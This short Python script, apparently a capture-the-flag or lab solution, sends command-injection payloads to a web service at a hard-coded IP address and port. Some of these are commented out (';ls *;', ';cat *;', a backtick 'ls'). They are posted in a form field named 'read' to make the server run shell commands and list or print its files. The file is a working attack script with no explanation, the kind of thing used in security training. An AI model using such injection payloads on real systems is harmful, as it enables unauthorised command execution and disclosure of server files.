import requests
from bs4 import BeautifulSoup

url = 'http://108.136.148.181:9100/'

# payload = "`ls`"
# payload = ";ls *;"
# payload = ";cat *;"
# payload = ";ls b*/*;"
payload = "*/*;"

data = {
    "read" : payload
}

response = requests.post(url, data=data)
print(response.text)